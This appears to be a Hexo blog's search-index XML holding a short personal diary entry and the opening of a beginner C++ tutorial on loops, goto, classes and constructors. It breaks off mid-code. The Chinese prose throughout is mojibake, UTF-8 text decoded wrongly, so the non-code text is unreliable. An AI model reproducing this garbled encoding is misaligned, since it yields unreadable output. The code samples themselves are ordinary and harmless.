<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Ameuuã®ç”Ÿæ´»</title>
    <url>/2022/01/29/Ameuu%E3%81%AE%E7%94%9F%E6%B4%BB/</url>
    <content><![CDATA[<p>è´Ÿèƒ½é‡é¢„è­¦ï¼ï¼ï¼ï¼</p>
<span id="more"></span>

<p>æˆ‘è¿˜æ˜¯å¤§æƒŠå°æ€ªäº†ï¼Œäº‰åµæ—¢ç„¶å·²ç»æŒç»­äº†äºŒåå‡ å¹´ï¼Œæˆ‘æ˜¯æ”¹å˜ä¸äº†çš„ï¼Œå¤©äº®äº†å°±å¥½äº†â€¦â€¦</p>
<p>æ°”å–˜ä¸ä¸Šæ¥ï¼Œæ´»åƒæ˜¯å“®å–˜å¾æœè€…ï¼Œæˆ–è®¸çœŸçš„ä¸€ä¸å°å¿ƒå²”æ°”äº†æ•ˆæœä¼šæ›´å¥½å§ã€‚</p>
<p>å’Œå¥¹è°ˆäº†å¾ˆä¹…ï¼Œå¥¹ä¹Ÿæ›¾æœ‰ç†æƒ³ï¼Œä¹Ÿæ›¾æœ‰è‡ªå·±çš„äº‹ä¸šï¼Œä¸ºäº†æ‰€è°“çš„â€œçˆ±æƒ…â€å’Œâ€œæˆ‘ä»¬â€éšå¿åˆ°äº†ç°åœ¨ï¼Œå¦‚æœçœŸæœ‰é‡ç”Ÿè¯¥å¤šå¥½ã€‚</p>
<p>æˆ‘æƒ³ä»–è¿˜æ˜¯ä¸ä¼šç›¸ä¿¡æˆ‘ï¼Œåªè§‰å¾—æ˜¯ä¼ é”€æƒ¹å¾—ï¼Œä»–ä¹Ÿåªç›¸ä¿¡è‡ªå·±æ‰€æƒ³ç›¸ä¿¡çš„ï¼Œä¸è¯¥åœ¨ä¹çš„ï¼Œæ€ä¹ˆè¿˜æ˜¯è¿™ä¹ˆä¸çŸ¥å¥½æ­¹ï¼ˆ</p>
<p>å‡Œæ™¨ä¸¤ç‚¹çš„å†°é›¹è®©æƒ…æ„Ÿå†·é™äº†ä¸‹æ¥ï¼Œä¸€æ—¶é—´å€¾è¯‰æ¬²è¾¾åˆ°é¡¶å³°ï¼Œä½†è¿™äº›æ˜¯ä¸å¯ä»¥å’Œå¥¹è®²çš„ã€‚</p>
<p>å€¾è¯‰ä¹‹åæ‰€æœŸå¾…çš„æ­£åé¦ˆè¿˜æ˜¯æ²¡æœ‰è¾¾åˆ°é¢„æœŸï¼Œä½†è°ä¼šåœ¨ä¹å‘¢ (â—â€™â—¡â€™â—)</p>
<p>å¥¹æ€»æ˜¯åœ¨å„æ–¹é¢è®©æˆ‘å¿ƒç–¼ï¼Œåˆåœ¨æŸäº›æ–¹é¢è®©æˆ‘æ€’å…¶ä¸äº‰ï¼Œä¸ç®¡äº†å§ï¼</p>
<p>æ„è¯†æµç‰ˆç¢ç¢å¿µï¼ˆ</p>
<p>2022.2.12 â˜</p>
<p>å¥½éš¾å¥½éš¾å¥½éš¾ï¼ŒçŸ¥è¯†ç‚¹çŸ¥é“ä¸ªå¤§æ¦‚ï¼Œä½†ä¹Ÿåªæ˜¯å¤§æ¦‚</p>
<p>æ²¡åšè¿‡javaç±»å‹çš„é¢˜ç›®</p>
<p>å“ï¼Œæ„Ÿè§‰ä¸é€‚åˆğŸ™</p>
]]></content>
      <tags>
        <tag>ç¢ç¢å¿µ</tag>
      </tags>
  </entry>
  <entry>
    <title>Cè‰¹ä»å…¥é—¨åˆ°å…¥åœŸ</title>
    <url>/2022/02/10/C%E8%89%B9%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/</url>
    <content><![CDATA[<h3 id="ä¸€ã€å…¥é—¨"><a href="#ä¸€ã€å…¥é—¨" class="headerlink" title="ä¸€ã€å…¥é—¨"></a>ä¸€ã€å…¥é—¨</h3><p>å›½é™…æƒ¯ä¾‹ï¼Œè¾“å‡º<code>hello world</code></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;hello world&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">10</span>];</span><br><span class="line">    cin &gt;&gt; name;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;your name is:&quot;</span>&lt;&lt;name&lt;&lt;endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç”±äºå­¦è¿‡cï¼Œæ‰€ä»¥ç›¸åŒçš„ä¸œè¥¿å°±ä¸è¿‡å¤šèµ˜è¿°äº†</p>
<span id="more"></span>

<h4 id="1-forå¾ªç¯ç»ƒä¹ "><a href="#1-forå¾ªç¯ç»ƒä¹ " class="headerlink" title="1.forå¾ªç¯ç»ƒä¹ "></a>1.forå¾ªç¯ç»ƒä¹ </h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i &lt;= <span class="number">100</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i % <span class="number">7</span> == <span class="number">0</span> || i % <span class="number">10</span> == <span class="number">7</span> || (i / <span class="number">10</span> ) % <span class="number">10</span> == <span class="number">7</span>)&#123;</span><br><span class="line">            cout &lt;&lt; i &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-è·³è½¬è¯­å¥ä¹‹gotoè¯­å¥"><a href="#2-è·³è½¬è¯­å¥ä¹‹gotoè¯­å¥" class="headerlink" title="2.è·³è½¬è¯­å¥ä¹‹gotoè¯­å¥"></a>2.è·³è½¬è¯­å¥ä¹‹gotoè¯­å¥</h4><p>ï¼ˆä¸æ€ä¹ˆä½¿ç”¨</p>
<p><strong>ä½œç”¨ï¼š</strong>æ— æ¡ä»¶è·³è½¬è¯­å¥</p>
<p><strong>è¯­æ³•ï¼š</strong><code>goto æ ‡è®°;</code></p>
<p><strong>è§£é‡Šï¼š</strong>å¦‚æœæ ‡è®°çš„åç§°å­˜åœ¨ï¼Œæ‰§è¡Œåˆ°gotoè¯­å¥æ—¶ï¼Œä¼šè·³è½¬åˆ°æ ‡è®°çš„ä½ç½®</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;1 xxx&quot;</span> &lt;&lt;endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;2 xxx&quot;</span> &lt;&lt;endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;3 xxx&quot;</span> &lt;&lt;endl;</span><br><span class="line">    <span class="keyword">goto</span> FLAG;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;4 xxx&quot;</span> &lt;&lt;endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;5 xxx&quot;</span> &lt;&lt;endl;</span><br><span class="line">    FLAG:</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;6 xxx&quot;</span> &lt;&lt;endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;7 xxx&quot;</span> &lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="äºŒã€ç±»å’Œå¯¹è±¡"><a href="#äºŒã€ç±»å’Œå¯¹è±¡" class="headerlink" title="äºŒã€ç±»å’Œå¯¹è±¡"></a>äºŒã€ç±»å’Œå¯¹è±¡</h3><h4 id="2-1-å°è£…"><a href="#2-1-å°è£…" class="headerlink" title="2.1 å°è£…"></a>2.1 å°è£…</h4><p>å°†å±æ€§å’Œè¡Œä¸ºä½œä¸ºä¸€ä¸ªæ•´ä½“ï¼Œè¡¨ç°ç”Ÿæ´»ä¸­çš„äº‹ç‰©å¹¶å¯¹å±æ€§å’Œè¡Œä¸ºåŠ ä»¥æƒé™æ§åˆ¶ã€‚</p>
<p>è¯­æ³•ï¼š<code>class ClassName&#123; &#125;;</code></p>
<p>å®ä¾‹1ï¼šè®¾è®¡ä¸€ä¸ªåœ†ç±»ï¼Œæ±‚åœ†çš„é¢ç§¯</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PI 3.14</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CircleController</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line">    <span class="keyword">int</span> r;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">calculation</span><span class="params">(<span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> PI * r * r;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> r = <span class="number">10</span>;</span><br><span class="line">    CircleController c1;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;åœ†çš„é¢ç§¯ä¸ºï¼š&quot;</span> &lt;&lt; c1.<span class="built_in">calculation</span>(r) &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å®ä¾‹2ï¼šStudentç±»</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line">    string name  = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> id = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// è·å–ä¿¡æ¯</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setInfot</span><span class="params">(string name,<span class="keyword">int</span> id)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">        <span class="keyword">this</span>-&gt;id = id;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">// è¾“å‡ºä¿¡æ¯</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">printInfor</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;your name:&quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;name &lt;&lt; <span class="string">&quot; and your id:&quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;id &lt;&lt; endl;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Student s1;</span><br><span class="line">    string name;</span><br><span class="line">    <span class="keyword">int</span> id = <span class="number">1</span>;</span><br><span class="line">    cin &gt;&gt; name;</span><br><span class="line">    cin &gt;&gt; id;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;your name:&quot;</span> &lt;&lt; name &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;your id:&quot;</span> &lt;&lt; id &lt;&lt; endl;</span><br><span class="line">    s1.<span class="built_in">setInfot</span>(name,id);</span><br><span class="line">    s1.<span class="built_in">printInfor</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è®¿é—®æƒé™æœ‰ï¼ŒClassçš„é»˜è®¤æƒé™æ˜¯<code>private</code>ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å…¬å…±æƒé™ public</span><br><span class="line">ä¿æŠ¤æƒé™ protected</span><br><span class="line">ç§æœ‰æƒé™ private</span><br></pre></td></tr></table></figure>

<p>æ¡ˆä¾‹3ï¼šè®¾è®¡ç«‹æ–¹ä½“ç±»ï¼ˆCubeï¼‰</p>
<p>æ±‚å‡ºç«‹æ–¹ä½“çš„é¢ç§¯å’Œä½“ç§¯ï¼Œåˆ†åˆ«ç”¨å…¨å±€å‡½æ•°å’Œæˆå‘˜å‡½æ•°åˆ¤æ–­ä¸¤ä¸ªç«‹æ–¹ä½“æ˜¯å¦ç›¸ç­‰</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cube</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line">    <span class="keyword">double</span> m_L;</span><br><span class="line">    <span class="keyword">double</span> m_W;</span><br><span class="line">    <span class="keyword">double</span> m_H;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">getL</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> m_L;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">getW</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> m_W;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">getH</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> m_H;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">measure</span><span class="params">(Cube c)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(m_L == c.<span class="built_in">getL</span>() &amp;&amp; m_W == c.<span class="built_in">getW</span>() &amp;&amp; m_H == c.<span class="built_in">getH</span>())&#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;yes&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;no&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setData</span><span class="params">(<span class="keyword">double</span> L,<span class="keyword">double</span> W,<span class="keyword">double</span> H)</span></span>&#123;</span><br><span class="line">        m_L = L;</span><br><span class="line">        m_W = W;</span><br><span class="line">        m_H = H;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">getVolume</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> m_L * m_W * m_H;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">getArea</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * (m_L * m_W + m_W * m_H + m_L * m_H);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Measure</span><span class="params">(Cube c1,Cube c2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(c1.<span class="built_in">getL</span>() == c2.<span class="built_in">getL</span>() &amp;&amp; c1.<span class="built_in">getW</span>() == c2.<span class="built_in">getW</span>() &amp;&amp; c1.<span class="built_in">getH</span>() == c2.<span class="built_in">getH</span>())&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;yes&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;no&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Cube c1;</span><br><span class="line">    Cube c2;</span><br><span class="line">    c1.<span class="built_in">setData</span>(<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>);</span><br><span class="line">    c2.<span class="built_in">setData</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line">    c1.<span class="built_in">measure</span>(c2);</span><br><span class="line">    <span class="built_in">Measure</span>(c1,c2);</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;your volume:&quot;</span> &lt;&lt; c1.<span class="built_in">getVolume</span>() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;your area:&quot;</span> &lt;&lt; c1.<span class="built_in">getArea</span>() &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ¡ˆä¾‹4ï¼šç‚¹å’Œåœ†ä¹‹é—´çš„å…³ç³»</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> x,y;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setPoint</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;x = x;</span><br><span class="line">        <span class="keyword">this</span>-&gt;y = y;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getX</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getY</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Circle</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line">    <span class="keyword">int</span> r;</span><br><span class="line">    Point p;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setR</span><span class="params">(<span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;r = r;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setCenter</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">        p.<span class="built_in">setPoint</span>(x,y);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getR</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getCenterX</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> p.<span class="built_in">getX</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getCenterY</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> p.<span class="built_in">getY</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">measure</span><span class="params">(Circle c,Point p)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> res;</span><br><span class="line">    res = <span class="built_in">sqrt</span>((c.<span class="built_in">getCenterX</span>() - p.<span class="built_in">getX</span>()) * (c.<span class="built_in">getCenterX</span>() - p.<span class="built_in">getX</span>()) + (c.<span class="built_in">getCenterY</span>() - p.<span class="built_in">getY</span>()) * (c.<span class="built_in">getCenterY</span>() - p.<span class="built_in">getY</span>()));</span><br><span class="line">    <span class="keyword">if</span>(res == c.<span class="built_in">getR</span>())&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;the point on the circle&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(res &gt; c.<span class="built_in">getR</span>())&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;the point out the circle&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;the point in the circle&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Circle c;</span><br><span class="line">    c.<span class="built_in">setR</span>(<span class="number">10</span>);</span><br><span class="line">    c.<span class="built_in">setCenter</span>(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    Point p;</span><br><span class="line">    p.<span class="built_in">setPoint</span>(<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">measure</span>(c,p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-2-å¯¹è±¡çš„åˆå§‹åŒ–å’Œæ¸…ç†"><a href="#2-2-å¯¹è±¡çš„åˆå§‹åŒ–å’Œæ¸…ç†" class="headerlink" title="2.2 å¯¹è±¡çš„åˆå§‹åŒ–å’Œæ¸…ç†"></a>2.2 å¯¹è±¡çš„åˆå§‹åŒ–å’Œæ¸…ç†</h4><p>æ„é€ å‡½æ•°å’Œææ„å‡½æ•°</p>
<ul>
<li><p>æ„é€ å‡½æ•°ï¼šä¸»è¦ä½œç”¨åœ¨äºåˆ›å»ºå¯¹è±¡æ—¶ä¸ºå¯¹è±¡çš„æˆå‘˜å±æ€§èµ‹å€¼ï¼Œæ„é€ å‡½æ•°ç”±ç¼–è¯‘å™¨è‡ªåŠ¨è°ƒç”¨ï¼›</p>
</li>
<li><p>ææ„å‡½æ•°ï¼šä¸»è¦ä½œç”¨åœ¨äºå¯¹è±¡é”€æ¯å‰ç³»ç»Ÿè‡ªåŠ¨è°ƒç”¨ï¼Œæ‰§è¡Œä¸€äº›æ¸…ç†å·¥ä½œã€‚</p>
</li>
</ul>
<p>å®ä¾‹1ï¼š</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line">    string name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Person</span>();</span><br><span class="line">    ~<span class="built_in">Person</span>();</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setName</span><span class="params">(string name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">string <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>-&gt;age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;your name:&quot;</span> &lt;&lt; name &lt;&lt; <span class="string">&quot; your age:&quot;</span> &lt;&lt; age &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Person::<span class="built_in">Person</span>()</span><br><span class="line">&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;contruct function&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Person::~<span class="built_in">Person</span>()</span><br><span class="line">&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;BYE!&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Person p1;</span><br><span class="line">    p1.<span class="built_in">setName</span>(<span class="string">&quot;Ameuu&quot;</span>);</span><br><span class="line">    p1.<span class="built_in">print</span>();</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>æ„é€ å‡½æ•°çš„åˆ†ç±»åŠè°ƒç”¨</strong></p>
<p>åˆ†ç±»ï¼š</p>
<p>â€‹    æŒ‰å‚æ•°åˆ†ç±»ï¼šæœ‰å‚ã€æ— å‚</p>
<p>â€‹    æŒ‰ç±»å‹åˆ†ç±»ï¼šæ™®é€šã€æ‹·è´</p>
<p>è°ƒç”¨ï¼š</p>
<p>â€‹    æ‹¬å·æ³•ã€æ˜¾ç¤ºæ³•ã€éšå¼è½¬æ¢æ³•</p>
<p>ç¤ºä¾‹ï¼š</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 1.æ„é€ å‡½æ•°çš„åˆ†ç±»åŠè°ƒç”¨</span></span><br><span class="line"><span class="comment"> * åˆ†ç±»ï¼šæœ‰å‚ æ— å‚/ æ™®é€š æ‹·è´</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line">    string name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span 